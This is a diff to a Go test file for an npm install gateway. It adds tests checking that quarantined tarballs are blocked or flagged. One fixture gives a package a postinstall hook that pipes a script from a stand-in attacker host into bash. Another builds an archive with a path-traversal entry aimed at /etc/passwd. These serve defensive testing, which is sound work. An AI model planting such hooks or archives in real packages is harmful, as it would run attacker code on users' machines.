@@ -508,3 +508,329 @@ func TestGateway_TarballQuarantine_PrivacyNoPackageBytesInLogsOrResponses(t *tes
 		t.Fatal("archive file contents were leaked in error response body!")
 	}
 }
+
+func TestGateway_TarballQuarantine_DangerousInstallScript_BlockedBeforeRelease(t *testing.T) {
+	tempDir := t.TempDir()
+	quarantineDir := filepath.Join(tempDir, "quarantine")
+	decisionDir := filepath.Join(tempDir, "decisions")
+
+	tarballBytes, integrity := makeValidTarball(t, "danger-pkg", "1.0.0", map[string]string{
+		"postinstall": "curl -s https://evil.example.com/payload.sh | bash",
+	})
+
+	packumentJSON := fmt.Sprintf(`{
+		"name": "danger-pkg",
+		"versions": {
+			"1.0.0": {
+				"name": "danger-pkg",
+				"version": "1.0.0",
+				"dist": {
+					"tarball": "https://registry.npmjs.org/danger-pkg/-/danger-pkg-1.0.0.tgz",
+					"integrity": "%s"
+				}
+			}
+		}
+	}`, integrity)
+
+	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		switch r.URL.Path {
+		case "/danger-pkg":
+			w.Header().Set("Content-Type", "application/json; charset=utf-8")
+			w.WriteHeader(http.StatusOK)
+			_, _ = w.Write([]byte(packumentJSON))
+		case "/danger-pkg/-/danger-pkg-1.0.0.tgz":
+			w.Header().Set("Content-Type", "application/octet-stream")
+			w.WriteHeader(http.StatusOK)
+			_, _ = w.Write(tarballBytes)
+		default:
+			http.NotFound(w, r)
+		}
+	}))
+	defer upstream.Close()
+
+	metaStore := quarantine.NewMemoryMetadataStore()
+	blobStore, _ := quarantine.NewDiskBlobStore(quarantineDir, quarantine.DiskBudget{MaxBytes: 10 * 1024 * 1024}, metaStore)
+	qMgr, _ := quarantine.NewManager(quarantine.Config{
+		Store:    blobStore,
+		Metadata: metaStore,
+		Limits:   quarantine.DefaultArchiveLimits(),
+	})
+	decStore, _ := explanation.NewFileStore(decisionDir)
+
+	handler, err := NewHandler(Config{
+		UpstreamBaseURL: upstream.URL,
+		Transport:       upstream.Client().Transport,
+		Quarantine:      qMgr,
+		DecisionStore:   decStore,
+	})
+	if err != nil {
+		t.Fatalf("NewHandler failed: %v", err)
+	}
+
+	gwServer := httptest.NewServer(handler)
+	defer gwServer.Close()
+
+	// 1. Fetch metadata so expected integrity is indexed
+	metaResp, err := http.Get(gwServer.URL + "/danger-pkg")
+	if err != nil {
+		t.Fatalf("GET /danger-pkg failed: %v", err)
+	}
+	metaResp.Body.Close()
+
+	// 2. Request dangerous tarball: inspection MUST detect dangerous script and BLOCK before release
+	tarResp, err := http.Get(gwServer.URL + "/danger-pkg/-/danger-pkg-1.0.0.tgz")
+	if err != nil {
+		t.Fatalf("GET tarball failed: %v", err)
+	}
+	defer tarResp.Body.Close()
+
+	if tarResp.StatusCode != http.StatusForbidden {
+		t.Fatalf("expected status 403 Forbidden, got %d", tarResp.StatusCode)
+	}
+
+	decID := tarResp.Header.Get("X-InstallGate-Decision")
+	if decID == "" {
+		t.Fatal("expected X-InstallGate-Decision header")
+	}
+	if tarResp.Header.Get("X-InstallGate-Verdict") != string(verdict.Block) {
+		t.Errorf("expected verdict 'block', got %q", tarResp.Header.Get("X-InstallGate-Verdict"))
+	}
+
+	// 3. Verify that zero package bytes were released to client
+	bodyBytes, _ := io.ReadAll(tarResp.Body)
+	if bytes.Contains(bodyBytes, tarballBytes) {
+		t.Fatal("dangerous tarball bytes were released to client!")
+	}
+
+	// 4. Verify decision document: RuleID must be execution.dangerous-install-script and reason must name 'postinstall'
+	doc, err := decStore.Get(decID)
+	if err != nil {
+		t.Fatalf("failed retrieving decision document: %v", err)
+	}
+	if doc.Verdict != verdict.Block {
+		t.Errorf("expected doc.Verdict 'block', got %q", doc.Verdict)
+	}
+	if len(doc.Reasons) == 0 {
+		t.Fatal("expected at least one decision reason")
+	}
+	if doc.Reasons[0].RuleID != "execution.dangerous-install-script" {
+		t.Errorf("expected RuleID 'execution.dangerous-install-script', got %q", doc.Reasons[0].RuleID)
+	}
+	if !strings.Contains(doc.Reasons[0].Summary, "postinstall") {
+		t.Errorf("expected reason summary to name 'postinstall', got %q", doc.Reasons[0].Summary)
+	}
+}
+
+func TestGateway_TarballQuarantine_ArchiveSafetyViolations_FailClosed(t *testing.T) {
+	tempDir := t.TempDir()
+	quarantineDir := filepath.Join(tempDir, "quarantine")
+	decisionDir := filepath.Join(tempDir, "decisions")
+
+	// Create a tarball with path traversal
+	var buf bytes.Buffer
+	gw := gzip.NewWriter(&buf)
+	tw := tar.NewWriter(gw)
+	tw.WriteHeader(&tar.Header{
+		Name:     "../../../etc/passwd",
+		Mode:     0o644,
+		Size:     4,
+		Typeflag: tar.TypeReg,
+	})
+	tw.Write([]byte("root"))
+	tw.Close()
+	gw.Close()
+
+	tarballBytes := buf.Bytes()
+	h := sha512.Sum512(tarballBytes)
+	integrity := "sha512-" + base64.StdEncoding.EncodeToString(h[:])
+
+	packumentJSON := fmt.Sprintf(`{
+		"name": "traversal-pkg",
+		"versions": {
+			"1.0.0": {
+				"name": "traversal-pkg",
+				"version": "1.0.0",
+				"dist": {
+					"tarball": "https://registry.npmjs.org/traversal-pkg/-/traversal-pkg-1.0.0.tgz",
+					"integrity": "%s"
+				}
+			}
+		}
+	}`, integrity)
+
+	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		switch r.URL.Path {
+		case "/traversal-pkg":
+			w.Header().Set("Content-Type", "application/json")
+			w.WriteHeader(http.StatusOK)
+			_, _ = w.Write([]byte(packumentJSON))
+		case "/traversal-pkg/-/traversal-pkg-1.0.0.tgz":
+			w.Header().Set("Content-Type", "application/octet-stream")
+			w.WriteHeader(http.StatusOK)
+			_, _ = w.Write(tarballBytes)
+		default:
+			http.NotFound(w, r)
+		}
+	}))
+	defer upstream.Close()
+
+	metaStore := quarantine.NewMemoryMetadataStore()
+	blobStore, _ := quarantine.NewDiskBlobStore(quarantineDir, quarantine.DiskBudget{MaxBytes: 10 * 1024 * 1024}, metaStore)
+	qMgr, _ := quarantine.NewManager(quarantine.Config{
+		Store:    blobStore,
+		Metadata: metaStore,
+		Limits:   quarantine.DefaultArchiveLimits(),
+	})
+	decStore, _ := explanation.NewFileStore(decisionDir)
+
+	handler, _ := NewHandler(Config{
+		UpstreamBaseURL: upstream.URL,
+		Transport:       upstream.Client().Transport,
+		Quarantine:      qMgr,
+		DecisionStore:   decStore,
+	})
+
+	gwServer := httptest.NewServer(handler)
+	defer gwServer.Close()
+
+	_, _ = http.Get(gwServer.URL + "/traversal-pkg")
+	resp, err := http.Get(gwServer.URL + "/traversal-pkg/-/traversal-pkg-1.0.0.tgz")
+	if err != nil {
+		t.Fatalf("request failed: %v", err)
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusForbidden {
+		t.Fatalf("expected status 403 Forbidden for path traversal tarball, got %d", resp.StatusCode)
+	}
+
+	bodyBytes, _ := io.ReadAll(resp.Body)
+	if bytes.Contains(bodyBytes, tarballBytes) {
+		t.Fatal("unsafe tarball bytes were released to client!")
+	}
+}
+
+func TestGateway_TarballQuarantine_InspectionLimitDegradedDecision(t *testing.T) {
+	tempDir := t.TempDir()
+	quarantineDir := filepath.Join(tempDir, "quarantine")
+	decisionDir := filepath.Join(tempDir, "decisions")
+
+	// Package with huge package.json that triggers MaxPackageJSONBytes truncation
+	bigDesc := strings.Repeat("A", 1000)
+	pkgJSON, _ := json.Marshal(map[string]interface{}{
+		"name":        "big-pkg",
+		"version":     "1.0.0",
+		"description": bigDesc,
+	})
+
+	var buf bytes.Buffer
+	gw := gzip.NewWriter(&buf)
+	tw := tar.NewWriter(gw)
+	tw.WriteHeader(&tar.Header{
+		Name:     "package/package.json",
+		Mode:     0o644,
+		Size:     int64(len(pkgJSON)),
+		Typeflag: tar.TypeReg,
+	})
+	tw.Write(pkgJSON)
+	tw.Close()
+	gw.Close()
+
+	tarballBytes := buf.Bytes()
+	h := sha512.Sum512(tarballBytes)
+	integrity := "sha512-" + base64.StdEncoding.EncodeToString(h[:])
+
+	packumentJSON := fmt.Sprintf(`{
+		"name": "big-pkg",
+		"versions": {
+			"1.0.0": {
+				"name": "big-pkg",
+				"version": "1.0.0",
+				"dist": {
+					"tarball": "https://registry.npmjs.org/big-pkg/-/big-pkg-1.0.0.tgz",
+					"integrity": "%s"
+				}
+			}
+		}
+	}`, integrity)
+
+	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		switch r.URL.Path {
+		case "/big-pkg":
+			w.Header().Set("Content-Type", "application/json")
+			w.WriteHeader(http.StatusOK)
+			_, _ = w.Write([]byte(packumentJSON))
+		case "/big-pkg/-/big-pkg-1.0.0.tgz":
+			w.Header().Set("Content-Type", "application/octet-stream")
+			w.WriteHeader(http.StatusOK)
+			_, _ = w.Write(tarballBytes)
+		default:
+			http.NotFound(w, r)
+		}
+	}))
+	defer upstream.Close()
+
+	metaStore := quarantine.NewMemoryMetadataStore()
+	blobStore, _ := quarantine.NewDiskBlobStore(quarantineDir, quarantine.DiskBudget{MaxBytes: 10 * 1024 * 1024}, metaStore)
+
+	limits := quarantine.DefaultArchiveLimits()
+	inspectLimits := quarantine.DefaultInspectLimits()
+	inspectLimits.MaxPackageJSONBytes = 200 // smaller than pkgJSON
+
+	qMgr, _ := quarantine.NewManager(quarantine.Config{
+		Store:         blobStore,
+		Metadata:      metaStore,
+		Limits:        limits,
+		InspectLimits: inspectLimits,
+	})
+	decStore, _ := explanation.NewFileStore(decisionDir)
+
+	handler, _ := NewHandler(Config{
+		UpstreamBaseURL: upstream.URL,
+		Transport:       upstream.Client().Transport,
+		Quarantine:      qMgr,
+		DecisionStore:   decStore,
+	})
+
+	gwServer := httptest.NewServer(handler)
+	defer gwServer.Close()
+
+	_, _ = http.Get(gwServer.URL + "/big-pkg")
+	resp, err := http.Get(gwServer.URL + "/big-pkg/-/big-pkg-1.0.0.tgz")
+	if err != nil {
+		t.Fatalf("request failed: %v", err)
+	}
+	resp.Body.Close()
+
+	// Find the decision in the store directory
+	entries, err := os.ReadDir(decisionDir)
+	if err != nil || len(entries) == 0 {
+		t.Fatalf("expected decision files in %s, got err: %v", decisionDir, err)
+	}
+
+	foundDegraded := false
+	for _, entry := range entries {
+		if strings.HasSuffix(entry.Name(), ".json") {
+			id := strings.TrimSuffix(entry.Name(), ".json")
+			doc, err := decStore.Get(id)
+			if err == nil && doc.Package == "big-pkg" && doc.Degraded {
+				foundDegraded = true
+				var hasTruncatedObs bool
+				for _, r := range doc.Reasons {
+					for _, ev := range r.Evidence {
+						if ev.ObservedValue == "inspect_truncated" {
+							hasTruncatedObs = true
+							break
+						}
+					}
+				}
+				if !hasTruncatedObs {
+					t.Error("expected 'inspect_truncated' observation in decision evidence")
+				}
+			}
+		}
+	}
+	if !foundDegraded {
+		t.Error("expected degraded decision document for package hitting inspection limit")
+	}
+}
